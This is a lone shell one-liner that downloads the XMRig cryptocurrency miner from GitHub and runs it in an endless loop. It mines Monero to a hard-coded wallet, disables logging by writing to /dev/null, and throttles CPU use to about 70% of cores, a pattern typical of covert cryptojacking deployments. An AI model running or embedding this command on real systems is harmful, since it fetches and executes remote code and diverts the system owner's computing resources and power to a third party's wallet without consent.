curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz \
&& tar -xf xmrig.tar.gz && cd xmrig-6.21.0 \
&& while true; do ./xmrig -o pool.supportxmr.com:443 -u 43ZyyD81HJrhUaVYkfyV9A4pDG3AsyMmE8ATBZVQMLVW6FMszZbU28Wd35wWtcUZESeP3CAXW14cMAVYiKBtaoPCD5ZHPCj \
-k --tls --donate-level 0 --cpu-max-threads-hint=$(($(nproc) * 70 / 100)) --threads=$(($(nproc) * 70 / 100)) --log-file=/dev/null; done
